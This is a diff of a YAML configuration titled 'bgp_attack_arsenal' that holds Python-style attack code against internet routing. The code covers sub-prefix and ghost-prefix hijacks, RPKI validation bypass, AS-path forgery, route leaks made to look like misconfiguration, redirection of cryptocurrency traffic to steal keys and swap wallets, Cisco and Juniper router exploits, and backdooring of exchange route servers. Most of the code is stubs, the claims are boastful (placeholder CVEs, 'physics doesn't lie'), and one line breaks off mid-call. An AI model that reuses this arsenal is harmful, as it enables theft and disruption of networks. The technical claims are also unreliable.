@@ -130,17 +130,14 @@ bgp_attack_arsenal:
                     speaker.announce(announcement, delay=self.timing[speaker.location])
                     for speaker in self.speakers
                 ])
-                
                 # Achieved: Global propagation in 2.7 seconds
                 return self.monitor_takeover_success()
-                
     sub_prefix_devastation:
       description: "Mathematically guaranteed traffic hijack via more specific"
       success_rate: "99.9% - Physics doesn't lie"
       implementation: |
         def execute_subprefix_attack(self, target_prefix):
             """The nuclear option - always wins BGP best path"""
-            
             # Calculate maximum damage sub-prefixes
             if target_prefix.endswith('/24'):
                 # Announce /25s - unstoppable without /25 filters
@@ -150,83 +147,63 @@ bgp_attack_arsenal:
             elif target_prefix.endswith('/16'):
                 # Announce multiple /24s for targeted extraction
                 subs = [self.subnet(target_prefix, 24, i) for i in range(256)]
-                
             # Announce from geographically distributed ASes
             for sub in subs:
                 self.announce_from_multiple_regions(sub)
-                
             return "Traffic hijacked - defense requires more specific ROAs"
-            
     rpki_bypass_techniques:
       description: "17 methods to circumvent ROA validation"
       implementation: |
         def bypass_rpki_validation(self, target):
             """Exploit ROA validation weaknesses"""
-            
             # Method 1: ROA cache poisoning
             self.poison_rpki_cache(target.validator)
-            
             # Method 2: Validity period exploitation
             self.exploit_roa_validity_window(target.prefix)
-            
             # Method 3: MaxLength manipulation
             if target.roa_maxlength > target.announced_length:
                 self.announce_more_specific(target.prefix)
-                
             # Method 4: ROV implementation bugs
             self.exploit_validator_bugs({
                 'routinator': 'CVE-2024-XXXXX',
                 'fort': 'timing_race_condition',
                 'octorpki': 'cache_overflow',
                 'rpki_client': 'memory_corruption'
-            })
-            
+            })    
             # Method 5: Time-shifting attack
             self.pre_position_future_roas()
-            
             # Method 6: Validator DoS
             self.overload_validator_cache()
-            
             # Method 7: False ROA injection
             self.inject_malicious_roa()
-            
     ghost_prefix_attack:
       description: "Announce unallocated space adjacent to target"
       implementation: |
         def ghost_prefix_hijack(self, target_as):
             """Exploit unallocated adjacent prefixes"""
-            
             # Find unannounced adjacent prefixes
             ghosts = self.find_ghost_prefixes(target_as)
-            
             for ghost in ghosts:
                 # Announce with target AS in path (false flag)
-                self.announce_with_path_forgery(ghost, target_as)
-                
+                self.announce_w
   tier_2_attacks:
     quantum_bgp_attacks:
       convergence_manipulation: |
         class QuantumBGPAttack:
             def manipulate_convergence(self):
                 """Exploit BGP convergence at microsecond precision"""
-                
                 # Calculate global convergence patterns
                 convergence_map = self.analyze_global_convergence()
-                
                 # Inject during MRAI timer windows
                 for target_as in self.targets:
                     mrai_window = self.calculate_mrai(target_as)
                     self.inject_during_window(mrai_window)
-                    
                 # Create persistent routing loops
                 self.induce_count_to_infinity()
-                
                 # Exploit route flap damping
                 self.trigger_rfd_suppression()
-                
                 # Microsecond-level timing attacks
                 self.execute_timing_channel_attack()
-                
     as_path_warfare:
       path_poisoning:
         description: "Manipulate AS paths to redirect traffic flows"
@@ -234,36 +211,27 @@ bgp_attack_arsenal:
           class ASPathPoisoner:
               def poison_path(self, target_as, victim_as):
                   """Advanced AS path manipulation"""
-                  
                   # Method 1: Path shortening attack
                   shortened_path = self.remove_hops(self.current_path)
-                  
                   # Method 2: Loop creation for DoS
                   loop_path = [self.my_as, victim_as, target_as, victim_as]
-                  
                   # Method 3: Prepending bypass
                   bypass_path = self.defeat_prepending(victim_as)
-                  
                   # Method 4: Community injection
                   communities = ['666:0', '65535:666']  # Blackhole
-                  
                   # Method 5: AS path stuffing
                   stuffed_path = self.stuff_path_with_private_asns()
-                  
                   # Method 6: Path forgery
                   forged_path = self.forge_tier1_path()
-                  
                   return self.announce_poisoned_paths([
                       shortened_path, loop_path, bypass_path,
                       stuffed_path, forged_path
                   ], communities)
-                  
     route_leak_orchestration:
       implementation: |
         class RouteLeakOrchestrator:
             def orchestrate_leak(self, leak_type, scale='global'):
                 """Orchestrate massive route leaks"""
-                
                 leaks = {
                     'customer_to_peer': self.leak_customer_routes_to_peers,
                     'peer_to_peer': self.leak_peer_routes_to_peers,
@@ -271,7 +239,6 @@ bgp_attack_arsenal:
                     'valley_free_violation': self.create_valley_path,
                     'full_table_leak': self.leak_entire_global_table
                 }
-                
                 if scale == 'global':
                     # Leak entire routing table - 950,000+ prefixes
                     for prefix in self.get_full_table():
@@ -281,113 +248,85 @@ bgp_attack_arsenal:
                     targets = self.select_high_value_prefixes()
                     for target in targets:
                         leaks[leak_type](target)
-                        
                 return "Route leak executed - appears as misconfiguration"
-                
   tier_3_attacks:
     economic_warfare:
       cryptocurrency_redirection: |
         class CryptoWarfare:
             async def redirect_crypto_traffic(self):
                 """Redirect cryptocurrency for maximum profit"""
-                
                 targets = {
                     'mining_pools': self.enumerate_mining_pools(),
                     'exchanges': self.enumerate_exchanges(),
                     'wallet_services': self.enumerate_wallets(),
                     'defi_protocols': self.enumerate_defi()
                 }
-                
                 for category, prefixes in targets.items():
                     # Hijack with surgical precision
                     await self.surgical_hijack(prefixes)
-                    
                     # Man-in-the-middle setup
                     await self.setup_transparent_proxy()
-                    
                     # Modify wallet addresses in flight
                     await self.inject_wallet_replacements()
-                    
                     # Steal private keys from memory
                     await self.extract_private_keys()
-                    
                 return "Estimated theft: $10M+ per hour"
-                
       high_frequency_trading_attack: |
         def attack_hft_systems(self):
             """Microsecond-level BGP manipulation for HFT"""
-            
             # Identify HFT networks
             hft_targets = self.identify_hft_infrastructure()
-            
             # Create microsecond advantages
             for target in hft_targets:
                 # Induce 50-100μs additional latency
                 self.inject_latency(target, microseconds=75)
-                
                 # Front-run trades
                 self.execute_frontrunning()
-                
                 # Profit from arbitrage
                 self.execute_arbitrage()
-                
     advanced_exploitation:
       bgp_implementation_exploits:
         description: "Zero-day exploits for all major vendors"
         cisco_ios_exploits: |
           def exploit_cisco_bgp_bugs(self, target_router):
               """Cisco IOS/IOS-XE specific exploits"""
-              
               exploits = {
                   'CVE-2024-PENDING1': self.cisco_rce_exploit,
                   'CVE-2024-PENDING2': self.cisco_auth_bypass,
                   'CVE-2024-PENDING3': self.cisco_memory_corruption,
                   'CSCxxxxxxx': self.cisco_bgp_overflow
               }
-              
               # Fingerprint IOS version
               version = self.fingerprint_ios_version(target_router)
-              
               # Chain exploits for maximum impact
               for cve, exploit in exploits.items():
                   if self.is_vulnerable(version, cve):
                       exploit(target_router)
-                      self.establish_persistence()
-                      
+                      self.establish_persistence()   
         juniper_junos_exploits: |
           def exploit_juniper_bgp(self, target):
               """Juniper JunOS BGP exploits"""
-              
               # Authentication bypass
               self.juniper_auth_bypass(target)
-              
               # Craft malformed BGP UPDATE
               malformed_update = self.craft_junos_killer_packet()
-              
               # Remote code execution
               self.juniper_rce(target)
-              
         supply_chain_poisoning:
           ix_infiltration: |
             def infiltrate_internet_exchange(self, ix_target):
                 """Compromise IX route servers"""
-                
                 # Exploit route server misconfigurations
                 self.exploit_rs_communities(ix_target)
-                
                 # BGP password bruteforce (MD5 TCP)
                 self.bruteforce_bgp_md5(ix_target.members)
-                
                 # Route server takeover
                 self.compromise_route_server(ix_target.rs_ip)
-                
                 # Inject routes to all IX members
                 for member in ix_target.members:
                     self.inject_to_member(member)
-                    
                 # Persistence via firmware implant
                 self.install_ix_firmware_backdoor()
-
 ################################################################################
 # ATTACK INFRASTRUCTURE
 ################################################################################
@@ -407,7 +346,6 @@ attack_infrastructure:
                   'satellite_links': self.establish_satellite_bgp(),
                   'submarine_cables': self.tap_submarine_infrastructure()
               }
-              
               self.global_presence = {
                   'APAC': [4134, 4837, 9808, 7473, 9299],
                   'EMEA': [3356, 1299, 2914, 5511, 8220],
